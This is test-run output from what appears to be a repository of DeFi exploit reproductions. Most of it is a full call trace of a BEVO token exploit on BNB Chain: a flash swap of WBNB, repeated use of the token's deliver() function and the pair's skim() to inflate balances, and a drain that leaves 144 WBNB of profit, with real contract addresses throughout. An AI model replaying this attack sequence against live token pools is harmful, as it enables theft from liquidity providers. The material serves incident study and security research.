Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 336.36ms (750.54µs CPU time)

Ran 1 test for src/test/2023-01/BEVO_exp.sol:BEVOExploit
[PASS] testExploit() (gas: 408240)
Logs:
  WBNB balance after exploit: 144.000000000000000000

Traces:
  [439340] BEVOExploit::testExploit()
    ├─ [24420] WBNB::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [405490] PancakePair: WBNB-USDC::swap(0, 192500000000000000000 [1.925e20], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [29962] WBNB::transfer(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 192500000000000000000 [1.925e20])
    │   │   ├─ emit Transfer(from: PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 192500000000000000000 [1.925e20])
    │   │   └─ ← [Return] true
    │   ├─ [326821] BEVOExploit::pancakeCall(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 192500000000000000000 [1.925e20], 0x00)
    │   │   ├─ [534] WBNB::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 192500000000000000000 [1.925e20]
    │   │   ├─ [191226] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(192500000000000000000 [1.925e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1675071422 [1.675e9])
    │   │   │   ├─ [8225] WBNB::transferFrom(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], 192500000000000000000 [1.925e20])
    │   │   │   │   ├─ emit Transfer(from: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], value: 192500000000000000000 [1.925e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [21177] BEVO::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2893] PancakePair: BEVO-WBNB::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 145721197780523651391 [1.457e20], 5327282266398899539 [5.327e18], 1673083038 [1.673e9]
    │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   └─ ← [Return] 338221197780523651391 [3.382e20]
    │   │   │   ├─ [141078] PancakePair: BEVO-WBNB::swap(0, 3028774323006137313 [3.028e18], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [102047] BEVO::transfer(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3028774323006137313 [3.028e18])
    │   │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: 0x473141B6f5E33DD90BD653940a854b58e83451DB, value: 302877432300613 [3.028e14])
    │   │   │   │   │   ├─ emit Transfer(from: BEVO: [0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa], to: 0x0000000000000000000000000000000000000000, value: 302877432300613 [3.028e14])
    │   │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3027865690709235474 [3.027e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 338221197780523651391 [3.382e20]
    │   │   │   │   ├─ [5177] BEVO::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2298813336114922094 [2.298e18]
    │   │   │   │   ├─ emit Sync(reserve0: 338221197780523651391 [3.382e20], reserve1: 2298813336114922094 [2.298e18])
    │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 192500000000000000000 [1.925e20], amount1In: 305392722159868 [3.053e14], amount0Out: 0, amount1Out: 3028774323006137313 [3.028e18], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [5177] BEVO::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 3028267986646483923 [3.028e18]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [5177] BEVO::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 3028267986646483923 [3.028e18]
    │   │   ├─ [11609] BEVO::deliver(3028267986646483923 [3.028e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [48187] PancakePair: BEVO-WBNB::skim(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   └─ ← [Return] 338221197780523651391 [3.382e20]
    │   │   │   ├─ [3262] WBNB::transfer(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [5177] BEVO::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   └─ ← [Return] 6844218532359160336 [6.844e18]
    │   │   │   ├─ [31747] BEVO::transfer(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4545405196244238242 [4.545e18])
    │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: 0x473141B6f5E33DD90BD653940a854b58e83451DB, value: 454540519624423 [4.545e14])
    │   │   │   │   ├─ emit Transfer(from: BEVO: [0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa], to: 0x0000000000000000000000000000000000000000, value: 454540519624423 [4.545e14])
    │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4544041574685364973 [4.544e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [5177] BEVO::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 4544947785463603859 [4.544e18]
    │   │   ├─ [11609] BEVO::deliver(4544947785463603859 [4.544e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [42901] PancakePair: BEVO-WBNB::swap(337000000000000000000 [3.37e20], 0, BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 337000000000000000000 [3.37e20])
    │   │   │   │   ├─ emit Transfer(from: PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 337000000000000000000 [3.37e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   └─ ← [Return] 1221197780523651391 [1.221e18]
    │   │   │   ├─ [5177] BEVO::balanceOf(PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]) [staticcall]
    │   │   │   │   └─ ← [Return] 728234950164515176689 [7.282e20]
    │   │   │   ├─ emit Sync(reserve0: 1221197780523651391 [1.221e18], reserve1: 728234950164515176689 [7.282e20])
    │   │   │   ├─ emit Swap(sender: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 725936136828400254595 [7.259e20], amount0Out: 337000000000000000000 [3.37e20], amount1Out: 0, to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3262] WBNB::transfer(PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b], 193000000000000000000 [1.93e20])
    │   │   │   ├─ emit Transfer(from: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b], value: 193000000000000000000 [1.93e20])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [9796] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]) [staticcall]
    │   │   ├─ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]) [delegatecall]
    │   │   │   └─ ← [Return] 2419698099143706937273612 [2.419e24]
    │   │   └─ ← [Return] 2419698099143706937273612 [2.419e24]
    │   ├─ [534] WBNB::balanceOf(PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]) [staticcall]
    │   │   └─ ← [Return] 7860111160946076447840 [7.86e21]
    │   ├─ emit Sync(reserve0: 2419698099143706937273612 [2.419e24], reserve1: 7860111160946076447840 [7.86e21])
    │   ├─ emit Swap(sender: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 193000000000000000000 [1.93e20], amount0Out: 0, amount1Out: 192500000000000000000 [1.925e20], to: BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 144000000000000000000 [1.44e20]
    ├─ emit log_named_decimal_uint(key: "WBNB balance after exploit", val: 144000000000000000000 [1.44e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 415.08ms (13.74ms CPU time)

Ran 2 test suites in 416.91ms (751.45ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
